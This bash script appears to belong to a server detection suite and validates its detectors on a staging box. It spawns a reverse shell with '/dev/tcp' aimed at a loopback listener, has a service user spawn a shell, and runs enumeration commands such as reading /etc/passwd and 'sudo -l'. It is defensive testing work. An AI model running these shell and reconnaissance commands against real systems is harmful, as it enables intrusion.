#!/usr/bin/env bash
#
# redteam.sh - validate the detection suite against real triggers.
#
# Runs ON a hardened server and safely reproduces each attack the
# detectors are meant to catch, then checks that a matching incident
# file appeared in /var/log/sentinel. It confirms the detectors
# actually fire on real hardware - not just that the code parses.
#
#   Tests:
#     1. reverse-shell   a shell with a network socket on its stdio
#                        (loopback only - never connects off-box)
#     2. service-shell   the app/service user spawning a shell
#     3. recon-burst     a rapid series of enumeration commands
#
# ┌──────────────────────────────────────────────────────────────────┐
# │  RUN THIS ONLY ON A THROWAWAY / STAGING SERVER.                   │
# │  It spawns (harmless, loopback-bound) reverse shells and runs     │
# │  enumeration commands that WILL trip your alerting. Never point   │
# │  it at production or a box someone else is watching.              │
# └──────────────────────────────────────────────────────────────────┘
#
# Requires: root, the suite installed (/opt/watcher), and alert mode
# (refuses to run in active mode unless REDTEAM_FORCE=1, because active
# mode would kill the test processes and could ufw-block loopback).
set -uo pipefail

CONF=/opt/watcher/watcher.conf
EVID=/var/log/sentinel
PASS=0
FAIL=0
PIDS=()

green() { printf '\033[1;32m%s\033[0m\n' "$*"; }
red()   { printf '\033[1;31m%s\033[0m\n' "$*"; }
info()  { printf '\033[1;36m==>\033[0m %s\n' "$*"; }
die()   { red "ERROR: $*"; exit 1; }

cleanup() {
  for p in "${PIDS[@]:-}"; do kill "$p" 2>/dev/null || true; done
}
trap cleanup EXIT

# ------------------------------------------------------------- preconditions
[ "$(id -u)" -eq 0 ] || die "must run as root."
[ -f "$CONF" ] || die "suite not installed ($CONF missing). Run the playbook first."

conf_get() { # conf_get section key
  awk -F'=' -v s="[$1]" -v k="$2" '
    $0 ~ "^\\["  { insec = ($0 == s) }
    insec {
      key = $1; sub(/[ \t]+$/, "", key); sub(/^[ \t]+/, "", key)
      if (key == k) { val = substr($0, index($0, "=") + 1)
        sub(/^[ \t]+/, "", val); sub(/[ \t]+$/, "", val); print val; exit }
    }' "$CONF"
}

MODE=$(conf_get watcher mode)
SCAN=$(conf_get revshell scan_interval); SCAN=${SCAN:-5}
POLL=$(conf_get recon poll_interval);   POLL=${POLL:-10}
RWIN=$(conf_get recon window_seconds);  RWIN=${RWIN:-45}

if [ "$MODE" = "active" ] && [ "${REDTEAM_FORCE:-0}" != "1" ]; then
  die "watcher_mode is 'active'. Test in alert mode, or set REDTEAM_FORCE=1 if you accept that test sessions may be killed and loopback may be blocked."
fi

info "Detection suite validation (mode=$MODE, scan=${SCAN}s, recon poll=${POLL}s/win=${RWIN}s)"
echo  "    Incident files land in $EVID"
echo

count_incidents() {
  local files=( "$EVID"/incident-"$1"-*.txt )
  [ -e "${files[0]}" ] && echo "${#files[@]}" || echo 0
}

# Newest incident file for a tag (names embed a sortable timestamp).
latest_incident() {
  printf '%s\n' "$EVID"/incident-"$1"-*.txt | sort | tail -1
}

# assert_incident tag timeout_seconds
assert_incident() {
  local tag="$1" timeout="$2" before after waited=0
  before="$3"
  while [ "$waited" -lt "$timeout" ]; do
    after=$(count_incidents "$tag")
    if [ "$after" -gt "$before" ]; then
      green "PASS  [$tag] incident recorded ($(latest_incident "$tag"))"
      PASS=$((PASS + 1)); return 0
    fi
    sleep 2; waited=$((waited + 2))
  done
  red "FAIL  [$tag] no new incident within ${timeout}s"
  FAIL=$((FAIL + 1)); return 1
}

free_port() {
  python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1]); s.close()'
}

# ==================================================================== test 1
info "Test 1/3: reverse shell (loopback socket on shell stdio)"
before=$(count_incidents reverse-shell)
PORT=$(free_port)
# Listener that accepts one connection and holds it open, so the shell's
# stdio stays a live socket long enough for a scan tick to see it.
python3 -c "
import socket, time
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('127.0.0.1', $PORT)); s.listen(1)
c, _ = s.accept(); time.sleep($SCAN + 8)
" &
PIDS+=($!)
sleep 1
# Classic reverse shell, pointed at our own loopback listener.
setsid bash -c "bash -i >& /dev/tcp/127.0.0.1/$PORT 0>&1" >/dev/null 2>&1 &
PIDS+=($!)
assert_incident reverse-shell $((SCAN + 12)) "$before"
cleanup; PIDS=()
echo

# ==================================================================== test 2
info "Test 2/3: service/app user spawns a shell"
APP_USER=""
for u in $(conf_get revshell app_users | tr ',' ' ') app www-data; do
  if id "$u" >/dev/null 2>&1; then APP_USER="$u"; break; fi
done
if [ -z "$APP_USER" ]; then
  red "SKIP  [service-shell] no app/www-data user on this box"
else
  echo "    using service user: $APP_USER"
  before=$(count_incidents service-shell)
  # A shell owned by the service user, kept alive across a scan tick.
  # The trailing `; :` stops bash from exec-optimising itself into the
  # sleep binary, so the process keeps `bash` as its comm.
  setsid sudo -u "$APP_USER" bash -c "sleep $((SCAN + 6)); :" >/dev/null 2>&1 &
  PIDS+=($!)
  assert_incident service-shell $((SCAN + 12)) "$before"
  cleanup; PIDS=()
fi
echo

# ==================================================================== test 3
info "Test 3/3: recon burst (enumeration commands in one session)"
before=$(count_incidents recon-burst)
# Distinct enumeration indicators, run in this session so they share an
# audit session id. Output discarded; we only care that they execute.
{
  whoami
  id
  uname -a
  cat /etc/passwd
  sudo -l
  ss -tan
  ps aux
  last
} >/dev/null 2>&1
echo "    ran 8 enumeration commands; waiting for the detector to poll..."
assert_incident recon-burst $((POLL + RWIN + 10)) "$before"
echo

# ======================================================================= done
info "Results: $PASS passed, $FAIL failed"
if [ "$FAIL" -eq 0 ]; then
  green "All detectors fired. Check your Telegram for the matching alerts,"
  green "and inspect the evidence files in $EVID."
  exit 0
fi
red "Some detectors did not fire. Check that the services are running:"
echo "    systemctl status login-watcher revshell-scan recon-watch"
echo "    journalctl -u revshell-scan -u recon-watch --since '-5 min'"
exit 1
